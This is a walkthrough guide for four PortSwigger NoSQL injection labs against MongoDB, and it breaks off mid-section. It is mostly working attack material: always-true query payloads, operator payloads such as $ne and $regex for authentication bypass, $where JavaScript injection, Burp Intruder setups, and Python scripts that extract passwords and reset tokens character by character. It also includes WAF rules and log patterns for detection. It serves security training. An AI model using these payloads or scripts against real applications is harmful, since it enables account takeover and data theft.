# NoSQL Injection - PortSwigger Labs Complete Guide

## Overview

This guide covers all NoSQL injection labs from PortSwigger Web Security Academy. NoSQL injection allows attackers to interfere with database queries in NoSQL systems, potentially enabling authentication bypass, data extraction, denial of service, and code execution.

**Lab Count:** 4 labs
**Database Focus:** MongoDB
**Attack Types:** Syntax injection and operator injection

---

## Lab 1: Detecting NoSQL Injection

**Difficulty:** Apprentice
**URL:** https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection

### Objective

Perform a NoSQL injection attack that causes the application to display unreleased products.

### Vulnerability Description

The product category filter uses MongoDB and lacks proper input validation. The application constructs queries by concatenating user input directly into JavaScript code, allowing attackers to inject malicious JavaScript that breaks out of the original query context.

### Background Query Structure

```javascript
// Vulnerable query construction
this.category == 'Gifts'
```

When the category parameter contains `Gifts`, the query returns only products in the Gifts category. The goal is to manipulate this logic to return ALL products.

### Solution Steps

**Step 1: Locate Vulnerable Parameter**
1. Navigate to the lab
2. Click on any product category filter (e.g., "Gifts")
3. Open Burp Suite → Proxy → HTTP history
4. Find the GET request with the category parameter:
   ```
   GET /filter?category=Gifts HTTP/1.1
   ```

**Step 2: Test for Injection Point**
1. Send request to Burp Repeater (Right-click → Send to Repeater)
2. Change the category parameter to include a single quote:
   ```
   GET /filter?category=Gifts' HTTP/1.1
   ```
3. Send the request
4. **Observe:** Server returns an error or unexpected behavior
5. **Why this works:** The single quote breaks the JavaScript string, causing a syntax error

**Step 3: Validate Injection**
1. Try a payload that completes the string syntax:
   ```
   GET /filter?category=Gifts'%2b' HTTP/1.1
   ```
   URL-decoded: `Gifts'+'`

2. **Expected result:** No error (query executes successfully)
3. **What happened:** The concatenation `'Gifts' + ''` is valid JavaScript

**Step 4: Test Boolean Conditions**

**False Condition Test:**
```
GET /filter?category=Gifts'%20%26%26%200%20%26%26%20'x HTTP/1.1
```
URL-decoded: `Gifts' && 0 && 'x`

Resulting query:
```javascript
this.category == 'Gifts' && 0 && 'x'
```

**Analysis:**
- `'Gifts' && 0` evaluates to `0` (falsy)
- `0 && 'x'` evaluates to `0`
- No products returned

**True Condition Test:**
```
GET /filter?category=Gifts'%20%26%26%201%20%26%26%20'x HTTP/1.1
```
URL-decoded: `Gifts' && 1 && 'x`

Resulting query:
```javascript
this.category == 'Gifts' && 1 && 'x'
```

**Analysis:**
- First checks if category equals 'Gifts'
- Then evaluates `true && 1 && 'x'` which is truthy
- Returns Gifts products

**Step 5: Always-True Payload (Lab Solution)**
```
GET /filter?category=Gifts'%7c%7c1%7c%7c' HTTP/1.1
```
URL-decoded: `Gifts'||1||'`

Resulting query:
```javascript
this.category == 'Gifts' || 1 || ''
```

**Analysis:**
- JavaScript OR operator (`||`) returns the first truthy value
- `1` is always truthy
- The condition ALWAYS evaluates to true regardless of category
- Returns ALL products including unreleased ones

**Step 6: Verify Success**
1. Send the request with `Gifts'||1||'` payload
2. Right-click response → "Show response in browser"
3. Copy the URL and paste it in your browser
4. **Lab Solved:** The page displays unreleased products

### Alternative Payloads

```javascript
// Always true conditions
'||'1'=='1'||'
'||true||'
'||1==1||'

// Using different logical operators
') || true || ('
') || 1 || ('
```

### Key Techniques

**JavaScript Injection:**
- Breaking out of string context with quotes
- Using logical operators to manipulate conditions
- Creating always-true boolean expressions

**Boolean Logic Manipulation:**
```javascript
// Original: category == 'Gifts'
// Injected: category == 'Gifts' || 1 || ''
// Result: Always true (returns all records)
```

### Burp Suite Tools Used

- **Burp Proxy:** Intercept and analyze HTTP requests
- **Burp Repeater:** Test and modify payloads iteratively
- **Browser Integration:** View rendered responses

### Common Mistakes & Troubleshooting

**Issue:** Payload doesn't work
- **Solution:** Ensure proper URL encoding
  - `||` = `%7c%7c`
  - Space = `%20`
  - `&&` = `%26%26`

**Issue:** Still getting filtered results
- **Solution:** Check that your boolean logic creates an always-true condition
- **Solution:** Verify the OR operator (`||`) is correctly encoded

**Issue:** Syntax error in response
- **Solution:** Make sure quotes are balanced: `'Gifts'||1||'`
- **Solution:** Test simpler payloads first: `Gifts'+'`

### Real-World Impact

This vulnerability allows attackers to:
- **Bypass access controls:** View restricted/unreleased products
- **Enumerate data:** Extract information about all database records
- **Logic manipulation:** Alter application behavior through query manipulation

### Detection Methods

**Manual Testing:**
1. Submit special characters: `'`, `"`, `\`, `$`, `{`, `}`
2. Test boolean conditions: `' && 0 && '`, `' && 1 && '`
3. Try logical operators: `' || 1 || '`
4. Monitor response differences

**Automated Scanning:**
```bash
# NoSQLMap
python nosqlmap.py -u "http://target.com/filter?category=test" -p category

# Custom script
curl "http://target.com/filter?category=test'||1||'"
```

---

## Lab 2: Exploiting NoSQL Operator Injection to Bypass Authentication

**Difficulty:** Apprentice
**URL:** https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication

### Objective

Bypass the authentication system and gain access to the administrator account by exploiting MongoDB operator injection.

### Vulnerability Description

The login functionality accepts JSON data and doesn't properly validate input types. Instead of treating the username and password as strings, the application allows MongoDB query operators to be injected, enabling attackers to manipulate the authentication query logic.

### Background Query Structure

**Normal Login Query:**
```javascript
db.users.findOne({
  username: "wiener",
  password: "peter"
})
```

**Vulnerable Code Pattern:**
```javascript
// Unsafe: Accepts user input directly
const user = db.users.findOne({
  username: req.body.username,
  password: req.body.password
});
```

### Solution Steps

**Step 1: Establish Baseline**
1. Navigate to the login page
2. Log in with provided credentials:
   - Username: `wiener`
   - Password: `peter`
3. Verify successful authentication
4. Log out

**Step 2: Intercept Login Request**
1. Open Burp Suite → Proxy → Intercept is on
2. Attempt to log in again with wiener:peter
3. Intercept the POST request:
   ```http
   POST /login HTTP/1.1
   Host: lab-id.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 29

   username=wiener&password=peter
   ```
4. Send to Repeater (Right-click → Send to Repeater)

**Step 3: Convert to JSON Format**
1. Modify the Content-Type header:
   ```http
   Content-Type: application/json
   ```
2. Change the request body to JSON:
   ```json
   {
     "username": "wiener",
     "password": "peter"
   }
   ```
3. Send the request
4. **Verify:** Response shows successful login (same as before)

**Step 4: Test $ne (Not Equal) Operator**

**Theory:**
MongoDB's `$ne` operator means "not equal". The query `{password: {$ne: ""}}` matches any document where password is not an empty string (i.e., any account with a password).

**Payload 1 - Test with valid user:**
```json
{
  "username": "wiener",
  "password": {"$ne": ""}
}
```

**Analysis:**
```javascript
// Resulting MongoDB query
db.users.findOne({
  username: "wiener",
  password: {$ne: ""}  // Matches if password is not empty
})
```

**Result:** Successful login without knowing the password!

**Payload 2 - Test username with $ne:**
```json
{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}
```

**Analysis:**
```javascript
// Resulting MongoDB query
db.users.findOne({
  username: {$ne: ""},  // Matches any username that's not empty
  password: {$ne: ""}   // Matches any password that's not empty
})
```

**Result:** Logs in as the first user in the database (likely administrator)

**Step 5: Target Administrator Account with $regex**

**Theory:**
The `$regex` operator allows pattern matching. We can use it to specifically target the administrator account.

**Payload:**
```json
{
  "username": {"$regex": "admin.*"},
  "password": {"$ne": ""}
}
```

**Analysis:**
```javascript
// Resulting MongoDB query
db.users.findOne({
  username: {$regex: /admin.*/},  // Matches usernames starting with "admin"
  password: {$ne: ""}             // Matches any non-empty password
})
```

**Result:** Successfully authenticates as administrator!

**Step 6: Verify Success**
1. Send the request with the $regex payload
2. Observe the response showing admin access
3. Right-click → "Show response in browser"
4. Copy URL and open in browser
5. **Lab Solved:** Logged in as administrator

### Attack Payloads Reference

**Method 1: Not Equal Operator**
```json
{
  "username": "administrator",
  "password": {"$ne": ""}
}
```

**Method 2: Regex Pattern Matching**
```json
{
  "username": {"$regex": "admin"},
  "password": {"$ne": ""}
}
```

**Method 3: Greater Than Operator**
```json
{
  "username": "administrator",
  "password": {"$gt": ""}
}
```

**Method 4: Exists Operator**
```json
{
  "username": "administrator",
  "password": {"$exists": true}
}
```

**Method 5: In Operator**
```json
{
  "username": {"$in": ["administrator", "admin", "root"]},
  "password": {"$ne": ""}
}
```

### MongoDB Operators Reference

| Operator | Description | Example |
|----------|-------------|---------|
| `$ne` | Not equal | `{password: {$ne: ""}}` |
| `$gt` | Greater than | `{age: {$gt: 18}}` |
| `$gte` | Greater than or equal | `{age: {$gte: 18}}` |
| `$lt` | Less than | `{age: {$lt: 65}}` |
| `$lte` | Less than or equal | `{age: {$lte: 65}}` |
| `$in` | In array | `{role: {$in: ["admin", "user"]}}` |
| `$nin` | Not in array | `{role: {$nin: ["guest"]}}` |
| `$exists` | Field exists | `{email: {$exists: true}}` |
| `$regex` | Pattern match | `{name: {$regex: "^John"}}` |
| `$where` | JavaScript | `{$where: "this.age > 18"}` |

### Burp Suite Workflow

1. **Proxy:** Intercept login request
2. **Repeater:** Test operator injection payloads
3. **Intruder (Optional):** Enumerate valid usernames
4. **Browser:** Verify successful authentication

### Common Mistakes & Troubleshooting

**Issue:** Request returns 400 Bad Request
- **Solution:** Ensure Content-Type is `application/json`
- **Solution:** Validate JSON syntax (use a JSON validator)

**Issue:** Still getting "Invalid credentials"
- **Solution:** Check if the application actually processes JSON
- **Solution:** Try URL-encoded format with operators: `username[$ne]=&password[$ne]=`

**Issue:** Lab doesn't solve
- **Solution:** Make sure you're accessing the response in the browser
- **Solution:** Verify you're logged in as "administrator" (check the account page)

### Alternative Attack Methods

**URL-Encoded Format:**
```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username[$ne]=invalid&password[$ne]=invalid
```

**Nested Operators:**
```json
{
  "username": {"$regex": "^a"},
  "password": {"$regex": ".*"}
}
```

**OR Logic:**
```json
{
  "$or": [
    {"username": "administrator"},
    {"role": "admin"}
  ],
  "password": {"$ne": ""}
}
```

### Real-World Impact

This vulnerability allows attackers to:
- **Complete authentication bypass:** Access any account without credentials
- **Privilege escalation:** Target administrative accounts
- **User enumeration:** Discover valid usernames through regex patterns
- **Mass account compromise:** Access multiple accounts programmatically

### Detection in the Wild

**Request Patterns to Monitor:**
```bash
# JSON with MongoDB operators
{"username":{"$ne":""},"password":{"$ne":""}}

# URL-encoded operators
username[$ne]=&password[$ne]=

# Regex patterns
{"username":{"$regex":"admin"}}

# Where clause injection
{"$where":"sleep(5000)"}
```

**WAF Rules:**
```
# Detect MongoDB operators in request body
SecRule REQUEST_BODY "@rx \$(?:ne|gt|gte|lt|lte|in|nin|regex|where|exists)" "id:1001,deny"
```

---

## Lab 3: Exploiting NoSQL Injection to Extract Data

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data

### Objective

Extract the administrator user's password from the database character-by-character, then use it to log in to the administrator account.

### Vulnerability Description

The user lookup functionality constructs MongoDB queries using JavaScript string concatenation. By injecting JavaScript code into the username parameter, attackers can execute arbitrary conditions that reveal information through boolean-based blind injection techniques.

### Background Query Structure

**Normal Query:**
```javascript
// User lookup
db.users.findOne({
  username: "wiener"
})
```

**Vulnerable Code:**
```javascript
// String concatenation vulnerability
let query = "this.username == '" + userInput + "'";
db.users.find({$where: query});
```

### Exploitation Techniques

**Technique 1: JavaScript Injection**
The application evaluates JavaScript in the `$where` clause, allowing code execution.

**Technique 2: Boolean-Based Blind Injection**
By crafting conditions that return true or false, we can extract data bit by bit based on application responses.

**Technique 3: Character-by-Character Enumeration**
Use array indexing and comparison to extract each character of the password.

### Solution Steps

**Step 1: Identify Injection Point**
1. Navigate to the lab
2. Log in as `wiener:peter`
3. Navigate to "My Account" page
4. URL should be: `GET /user/lookup?user=wiener`
5. Open Burp Suite → HTTP History
6. Find the user lookup request
7. Send to Repeater

**Step 2: Test for JavaScript Injection**

**Test 1 - Single Quote:**
```
GET /user/lookup?user=wiener' HTTP/1.1
```

**Expected:** Error or "Could not find user"
**Why:** Breaks the JavaScript string syntax

**Test 2 - Concatenation:**
```
GET /user/lookup?user=wiener'%2b' HTTP/1.1
```
URL-decoded: `wiener'+'`

**Expected:** User details displayed
**Why:** `'wiener' + ''` is valid JavaScript

**Resulting query:**
```javascript
this.username == 'wiener' + ''
// Equivalent to: this.username == 'wiener'
```

**Step 3: Test Boolean Conditions**

**False Condition:**
```
GET /user/lookup?user=wiener'%20%26%26%20'1'%3d%3d'2 HTTP/1.1
```
URL-decoded: `wiener' && '1'=='2`

**Resulting query:**
```javascript
this.username == 'wiener' && '1' == '2'
// Evaluates to: true && false = false
```

**Expected:** "Could not find user"

**True Condition:**
```
GET /user/lookup?user=wiener'%20%26%26%20'1'%3d%3d'1 HTTP/1.1
```
URL-decoded: `wiener' && '1'=='1`

**Resulting query:**
```javascript
this.username == 'wiener' && '1' == '1'
// Evaluates to: true && true = true
```

**Expected:** User details displayed

**Step 4: Determine Password Length**

**Theory:**
Use the `length` property to check password length.

**Payload Template:**
```
administrator' && this.password.length == X || 'a'=='b
```

**Explanation:**
- `administrator' && this.password.length == X` - Check if admin's password length equals X
- `|| 'a'=='b` - OR false (ensures string is closed properly)

**Manual Testing:**
```
# Test length 8
GET /user/lookup?user=administrator'%20%26%26%20this.password.length%20%3d%3d%208%20%7c%7c%20'a'%3d%3d'b HTTP/1.1
URL-decoded: administrator' && this.password.length == 8 || 'a'=='b

# Test length 16
GET /user/lookup?user=administrator'%20%26%26%20this.password.length%20%3d%3d%2016%20%7c%7c%20'a'%3d%3d'b HTTP/1.1

# Test length 32
GET /user/lookup?user=administrator'%20%26%26%20this.password.length%20%3d%3d%2032%20%7c%7c%20'a'%3d%3d'b HTTP/1.1
```

**Alternative - Less Than:**
```
administrator' && this.password.length < 30 || 'a'=='b
```

**Process:**
1. Start with `< 30` - if true (user found), password is less than 30
2. Try `< 20` - if true, password is less than 20
3. Try `< 10` - if true, password is less than 10
4. Continue narrowing until exact length found (8 characters)

**Step 5: Extract Password Characters (Burp Intruder)**

**Payload Structure:**
```
administrator' && this.password[0]=='a' || 'a'=='b
```

**Explanation:**
- `this.password[0]` - Access first character (index 0)
- `=='a'` - Check if it equals 'a'
- If match: User details displayed
- If no match: "Could not find user"

**Burp Intruder Configuration:**

1. **Select Attack Position:**
   ```
   GET /user/lookup?user=administrator'%20%26%26%20this.password[§0§]%3d%3d'§a§'%20%7c%7c%20'a'%3d%3d'b HTTP/1.1
   ```

2. **Attack Type:** Cluster bomb
   - Position 1: Character index (0-7)
   - Position 2: Character to test (a-z)

3. **Payload Set 1 (Character Positions):**
   - Type: Numbers
   - From: 0
   - To: 7
   - Step: 1

4. **Payload Set 2 (Characters):**
   - Type: Simple list
   - Values: a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z

5. **Grep Match:**
   - Add grep string: "Your username is:"
   - Or use response length differences

6. **Start Attack**

**Step 6: Analyze Results**

**Sorting Method 1 - Response Length:**
1. Sort by "Length" column
2. Look for responses that are significantly longer
3. These indicate character matches

**Sorting Method 2 - Grep Match:**
1. Look at "Grep - match" column
2. Check marks indicate successful matches

**Example Results:**
```
Position 0, Character 'u' - Match (length: 2834)
Position 1, Character 'y' - Match (length: 2834)
Position 2, Character 'f' - Match (length: 2834)
Position 3, Character 'w' - Match (length: 2834)
Position 4, Character 'o' - Match (length: 2834)
Position 5, Character 'a' - Match (length: 2834)
Position 6, Character 'e' - Match (length: 2834)
Position 7, Character 'm' - Match (length: 2834)
```

**Extracted Password:** `uyfwoaem`

**Step 7: Authenticate as Administrator**
1. Navigate to login page
2. Enter credentials:
   - Username: `administrator`
   - Password: `uyfwoaem` (extracted password)
3. Click "Log in"
4. **Lab Solved:** Successfully authenticated as administrator

### Alternative Extraction Methods

**Method 1: Using Substring/Slice**
```javascript
administrator' && this.password.substring(0,1)=='a' || 'a'=='b
administrator' && this.password.slice(0,1)=='a' || 'a'=='b
```

**Method 2: Using CharCodeAt**
```javascript
administrator' && this.password.charCodeAt(0)==97 || 'a'=='b
// 97 is ASCII code for 'a'
```

**Method 3: Using Regex**
```javascript
administrator' && this.password.match(/^a/) || 'a'=='b
```

### Optimization Strategies

**Binary Search for Characters:**
Instead of testing a-z sequentially, use binary search with character codes:

```python
import requests
import string

url = "https://lab-id.web-security-academy.net/user/lookup"
password = ""

for position in range(8):  # 8 character password
    low, high = 97, 122  # ASCII: 'a' to 'z'

    while low <= high:
        mid = (low + high) // 2
        payload = f"administrator' && this.password.charCodeAt({position})>{mid} || 'a'=='b"

        response = requests.get(url, params={'user': payload})

        if "Your username is:" in response.text:
            low = mid + 1
        else:
            high = mid - 1

    password += chr(low)
    print(f"Position {position}: {chr(low)}")

print(f"Password: {password}")
```

### Automated Extraction Script

```python
import requests
import string

def extract_password(url, username, password_length):
    password = ""
    chars = string.ascii_lowercase

    for position in range(password_length):
        for char in chars:
            payload = f"{username}' && this.password[{position}]=='{char}' || 'a'=='b"

            response = requests.get(url, params={'user': payload})

            if "Your username is:" in response.text:
                password += char
                print(f"[+] Position {position}: {char} (Current: {password})")
                break

    return password

# Usage
url = "https://lab-id.web-security-academy.net/user/lookup"
password = extract_password(url, "administrator", 8)
print(f"\n[+] Full password: {password}")
```

### Burp Suite Tools Used

- **Proxy:** Capture user lookup requests
- **Repeater:** Test injection payloads
- **Intruder:** Automate character enumeration (Cluster bomb attack)
- **Grep Match:** Identify successful character extractions

### Common Mistakes & Troubleshooting

**Issue:** All payloads return "Could not find user"
- **Solution:** Check payload encoding (spaces should be `%20`)
- **Solution:** Verify boolean logic is correct
- **Solution:** Test with known true condition first: `wiener' && '1'=='1`

**Issue:** Can't determine password length
- **Solution:** Start with broader range: `< 50`, then narrow down
- **Solution:** Use `== X` instead of `< X` for exact match
- **Solution:** Ensure you're testing against "administrator" not "wiener"

**Issue:** Intruder shows no clear matches
- **Solution:** Check response length differences more carefully
- **Solution:** Use Grep Match with specific string: "Your username is:"
- **Solution:** Verify payload positions are correct (§0§ and §a§)

**Issue:** Some characters not found
- **Solution:** Expand character set to include numbers: 0-9
- **Solution:** Check if password uses uppercase (A-Z)
- **Solution:** Lab specifically states "lowercase letters" only

### Real-World Impact

This vulnerability allows:
- **Complete credential theft:** Extract any user's password
- **Account takeover:** Access any account including administrators
- **Data exfiltration:** Extract sensitive information character-by-character
- **Reconnaissance:** Enumerate valid usernames and password formats

### Detection Methods

**Manual Testing:**
```
# Test JavaScript injection
user=test'+'

# Test boolean conditions
user=test' && '1'=='1
user=test' && '1'=='2

# Test password length
user=admin' && this.password.length<30||'1'=='2

# Test character extraction
user=admin' && this.password[0]=='a'||'1'=='2
```

**Automated Detection:**
```bash
# NoSQLMap
python nosqlmap.py -u "http://target.com/lookup?user=test" --extract

# Custom script with timing
curl "http://target.com/lookup?user=test'%26%26%20this.password.length%3c30%7c%7c'1'%3d%3d'2"
```

---

## Lab 4: Exploiting NoSQL Operator Injection to Extract Unknown Fields

**Difficulty:** Practitioner
**URL:** https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields

### Objective

Exploit NoSQL operator injection to identify a hidden password reset token field, extract its value for the user "carlos", and use it to reset his password and log in.

### Vulnerability Description

The login functionality accepts JSON input and evaluates JavaScript through the `$where` operator without proper sanitization. This allows attackers to:
1. Use MongoDB operators to bypass authentication
2. Execute JavaScript to enumerate database schema
3. Extract field names and values that aren't visible in the UI
4. Abuse password reset functionality with extracted tokens

### Background Query Structure

**Normal Login Query:**
```javascript
db.users.findOne({
  username: "wiener",
  password: "peter"
})
```

**Vulnerable Pattern with $where:**
```javascript
db.users.findOne({
  $where: "this.username == 'wiener' && this.password == 'peter'"
})
```

### Attack Chain Overview

```
1. Test operator injection ($ne)
2. Confirm JavaScript execution ($where)
3. Extract field names (Object.keys())
4. Identify reset token field name
5. Verify reset token endpoint
6. Extract token value character-by-character
7. Use token to reset carlos's password
8. Login as carlos
```

### Solution Steps

**Step 1: Intercept Login Request**
1. Navigate to the login page
2. Open Burp Suite → Proxy → Intercept is on
3. Enter any credentials and submit
4. Capture the POST request:
   ```http
   POST /login HTTP/1.1
   Host: lab-id.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded

   username=test&password=test
   ```
5. Send to Repeater

**Step 2: Convert to JSON and Test Operator Injection**

**Change Content-Type:**
```http
Content-Type: application/json
```

**Basic Payload:**
```json
{
  "username": "carlos",
  "password": {"$ne": "invalid"}
}
```

**Expected Response:**
```json
{
  "message": "Account locked: please reset your password"
}
```

**Analysis:**
- The `$ne` operator worked! (MongoDB operators are accepted)
- Response reveals carlos's account is locked
- Password reset functionality exists

**Step 3: Test JavaScript Execution with $where**

**False Condition:**
```json
{
  "username": "carlos",
  "password": "invalid",
  "$where": "0"
}
```

**Expected:** "Invalid username or password" (JavaScript `0` is falsy)

**True Condition:**
```json
{
  "username": "carlos",
  "password": "invalid",
  "$where": "1"
}
```

**Expected:** "Account locked" message

**Analysis:**
- `$where` accepts JavaScript code
- `1` evaluates to true, bypassing password check
- Confirms we can execute arbitrary JavaScript

**Step 4: Extract Field Names Using Object.keys()**

**Theory:**
JavaScript's `Object.keys(this)` returns an array of all field names in the current document.

**Payload Strategy:**
Use regex to extract field names character-by-character.

**Payload Template:**
```json
{
  "username": "carlos",
  "password": "invalid",
  "$where": "Object.keys(this)[INDEX].match('^.{POSITION}CHARACTER.*')"
}
```

**Explanation:**
- `Object.keys(this)` - Get all field names as array
- `[INDEX]` - Access specific field (0, 1, 2, etc.)
- `.match('^.{POSITION}CHARACTER.*')` - Regex to match character at position
  - `^` - Start of string
  - `.{POSITION}` - Skip POSITION characters
  - `CHARACTER` - Character to test
  - `.*` - Match rest of string

**Burp Intruder Setup - Extract Field Names:**

1. **Request Template:**
   ```http
   POST /login HTTP/1.1
   Content-Type: application/json

   {"username":"carlos","password":"invalid","$where":"Object.keys(this)[1].match('^.{§0§}§a§.*')"}
   ```

2. **Attack Type:** Cluster bomb

3. **Payload Set 1 (Position):**
   - Type: Numbers
   - From: 0
   - To: 20
   - Step: 1

4. **Payload Set 2 (Character):**
   - Type: Simple list
   - Add: a-z, A-Z, 0-9, underscore (_)

5. **Options → Grep - Match:**
   - Add: "Account locked"

6. **Start Attack**

**Step 5: Analyze Field Name Results**

**Sort Results:**
1. Click "Grep - match" column to sort by matches
2. Look for checked responses

**Example Results:**
```
Position 0, Char '_' - Match  → Field starts with '_'
Position 1, Char 'i' - Match  → Field is '_i...'
Position 2, Char 'd' - Match  → Field is '_id'
Position 3, Char (none) - No matches → Field 0 is "_id" (length 3)

# Move to field index 1
Position 0, Char 'u' - Match  → Field starts with 'u'
Position 1, Char 's' - Match  → Field is 'us...'
...continue...
Position 8, Char (none) - No matches → Field 1 is "username" (length 8)

# Continue with field index 2, 3, etc.
```

**Common MongoDB Fields:**
- `_id` - Document ID (MongoDB default)
- `username` - Username
- `password` - Password hash
- `email` - Email address
- `resetToken` - Password reset token (INTERESTING!)
- `forgotPwd` - Password reset token (alternative name)

**Discovered Token Field:** Let's assume it's `resetToken`

**Step 6: Identify Reset Token Endpoint**

**Common Patterns to Test:**
```
GET /forgot-password?resetToken=test
GET /forgot-password?token=test
GET /reset?resetToken=test
GET /reset-password?resetToken=test
```

**Test in Burp Repeater:**
```http
GET /forgot-password?resetToken=invalid HTTP/1.1
Host: lab-id.web-security-academy.net
```

**Expected Response:**
```
Invalid token
```

**Success!** This confirms:
1. The endpoint exists
2. The parameter name is correct
3. Token validation is working

**Step 7: Extract Reset Token Value**

**Payload Template:**
```json
{
  "username": "carlos",
  "password": "invalid",
  "$where": "this.resetToken.match('^.{POSITION}CHARACTER.*')"
}
```

**Burp Intruder Configuration:**

1. **Request Template:**
   ```http
   POST /login HTTP/1.1
   Content-Type: application/json

   {"username":"carlos","password":"invalid","$where":"this.resetToken.match('^.{§0§}§a§.*')"}
   ```

2. **Attack Type:** Cluster bomb

3. **Payload Set 1 (Position):**
   - Type: Numbers
   - From: 0
   - To: 35 (reset tokens are typically 32+ characters)
   - Step: 1

4. **Payload Set 2 (Character):**
   - Type: Simple list
   - Add: a-f, 0-9 (hex characters - common for tokens)
   - If no matches, expand to: a-z, A-Z, 0-9

5. **Options → Grep - Match:**
   - Add: "Account locked"

6. **Resource Pool:**
   - Create new resource pool
   - Maximum concurrent requests: 1 (to avoid rate limiting)

7. **Start Attack**

**Step 8: Analyze Token Extraction Results**

**Sort by Payload Position:**
1. Click "Payload 1" column header to sort
2. For each position, find the character that got a match

**Example Results:**
```
Position 0, Char 'a' - Match → Token[0] = 'a'
Position 1, Char '3' - Match → Token[1] = '3'
Position 2, Char 'f' - Match → Token[2] = 'f'
Position 3, Char '9' - Match → Token[3] = '9'
...continue...
Position 31, Char 'b' - Match → Token[31] = 'b'
Position 32, (no matches) - Token complete
```

**Extracted Token:** `a3f9e2c8d7b4a1f0e9d2c8b7a4f1e0d2` (example)

**Step 9: Reset Carlos's Password**

1. **Navigate to Reset Endpoint:**
   ```
   GET /forgot-password?resetToken=a3f9e2c8d7b4a1f0e9d2c8b7a4f1e0d2
   ```

2. **Enter New Password:**
   ```
   New password: password123
   Confirm password: password123
   ```

3. **Submit Form**

4. **Expected:** "Password reset successful"

**Step 10: Login as Carlos**
1. Navigate to login page
2. Enter credentials:
   - Username: `carlos`
   - Password: `password123` (your new password)
3. Click "Log in"
4. **Lab Solved:** Successfully authenticated as carlos

### Advanced Payload Examples

**Check Field Existence:**
```json
{
  "username": "carlos",
  "password": "invalid",
  "$where": "this.resetToken != null"
}
```

**Check Field Type:**
```json
{
  "username": "carlos",
  "password": "invalid",
  "$where": "typeof this.resetToken === 'string'"
}
```

**Extract Token Length:**
```json
{
  "username": "carlos",
  "password": "invalid",
  "$where": "this.resetToken.length == 32"
}
```

**Alternative Regex Patterns:**
```json
// More specific - hex only
{"$where": "this.resetToken.match('^.{0}[0-9a-f].*')"}

// Case insensitive
{"$where": "this.resetToken.match('^.{0}a.*', 'i')"}

// Using test() instead of match()
{"$where": "/^.{0}a.*/i.test(this.resetToken)"}
```

### Automated Extraction Script

```python
import requests
import json
import string

def extract_field_names(url, user, max_fields=5, max_length=20):
    """Extract field names from MongoDB document"""
    fields = []

    for field_index in range(max_fields):
        field_name = ""

        for pos in range(max_length):
            found = False

            for char in string.ascii_letters + string.digits + '_':
                payload = {
                    "username": user,
                    "password": "invalid",
                    "$where": f"Object.keys(this)[{field_index}].match('^.{{{pos}}}{char}.*')"
                }

                response = requests.post(url, json=payload)

                if "Account locked" in response.text:
                    field_name += char
                    print(f"[+] Field {field_index}, Position {pos}: {char} (Current: {field_name})")
                    found = True
                    break

            if not found:
                # No more characters in this field
                if field_name:
                    fields.append(field_name)
                    print(f"[+] Field {field_index} complete: {field_name}\n")
                break

        if not field_name:
            # No more fields
            break

    return fields

def extract_field_value(url, user, field_name, max_length=40):
    """Extract value of a specific field"""
    value = ""
    chars = string.ascii_letters + string.digits + '-_'

    for pos in range(max_length):
        found = False

        for char in chars:
            payload = {
                "username": user,
                "password": "invalid",
                "$where": f"this.{field_name}.match('^.{{{pos}}}{char}.*')"
            }

            response = requests.post(url, json=payload)

            if "Account locked" in response.text:
                value += char
                print(f"[+] Position {pos}: {char} (Current: {value})")
                found = True
                break

        if not found:
            # Value complete
            break

    return value

# Usage
url = "https://lab-id.web-security-academy.net/login"

print("[*] Extracting field names...")
fields = extract_field_names(url, "carlos")
print(f"\n[+] Found fields: {fields}\n")

# Identify token field (usually contains 'token' or 'reset')
token_field = [f for f in fields if 'token' in f.lower() or 'reset' in f.lower()][0]
print(f"[*] Token field identified: {token_field}\n")

print(f"[*] Extracting {token_field} value...")
token = extract_field_value(url, "carlos", token_field)
print(f"\n[+] Token: {token}")

print(f"\n[+] Use this URL to reset password:")
print(f"https://lab-id.web-security-academy.net/forgot-password?{token_field}={token}")
```

### Burp Suite Tools Used

- **Proxy:** Intercept login and reset requests
- **Repeater:** Test individual payloads
- **Intruder:** Automate field and value extraction (Cluster bomb)
- **Decoder:** URL encode/decode as needed

### Common Mistakes & Troubleshooting

**Issue:** No fields extracted
- **Solution:** Check field index - MongoDB documents always have `_id` at index 0
- **Solution:** Try different field indices: 0, 1, 2, 3
- **Solution:** Verify JavaScript syntax: `Object.keys(this)[INDEX]`

**Issue:** Token extraction returns no matches
- **Solution:** Verify token field name is correct
- **Solution:** Expand character set beyond a-f,0-9 to include full a-z,A-Z,0-9
- **Solution:** Check token length first: `this.resetToken.length`

**Issue:** Rate limiting or account lockout
- **Solution:** Configure Intruder resource pool: max 1 concurrent request
- **Solution:** Add delay between requests (Intruder → Resource pool → Delay)
- **Solution:** Use multiple accounts if available

**Issue:** Invalid token on reset
- **Solution:** Double-check extracted token has no typos
- **Solution:** Verify parameter name matches endpoint expectation
- **Solution:** Token may have expired - extract fresh token

**Issue:** Lab doesn't solve after login
- **Solution:** Ensure you're logging in as "carlos" not "wiener"
- **Solution:** Check that password reset actually worked
- **Solution:** Try logging out and back in

### Alternative Attack Vectors

**Using $in Operator:**
```json
{
  "username": {"$in": ["carlos", "administrator"]},
  "password": {"$ne": ""},
  "$where": "this.resetToken.length > 0"
}
```

**Using $regex:**
```json
{
  "username": "carlos",
  "password": {"$regex": ".*"},
  "$where": "this.resetToken.match('^a')"
}
```

**Direct Field Access:**
```json
{
  "username": "carlos",
  "password": "invalid",
  "$where": "Object.values(this).some(v => typeof v === 'string' && v.length > 30)"
}
```

### Real-World Impact

This vulnerability enables:
- **Schema disclosure:** Reveal hidden database fields
- **Account takeover:** Extract password reset tokens
- **Data exfiltration:** Access sensitive fields not exposed in UI
- **Privilege escalation:** Discover and exploit admin tokens or flags
- **Mass compromise:** Extract tokens for multiple users

### Detection in Production

**Request Monitoring:**
```bash
# Monitor for $where operator
grep '$where' /var/log/webapp/access.log

# Monitor for Object.keys() usage
grep 'Object.keys' /var/log/webapp/access.log

# Monitor for suspicious regex patterns
grep 'match.*\\^' /var/log/webapp/access.log
```

**WAF Rules:**
```
# Block $where operator
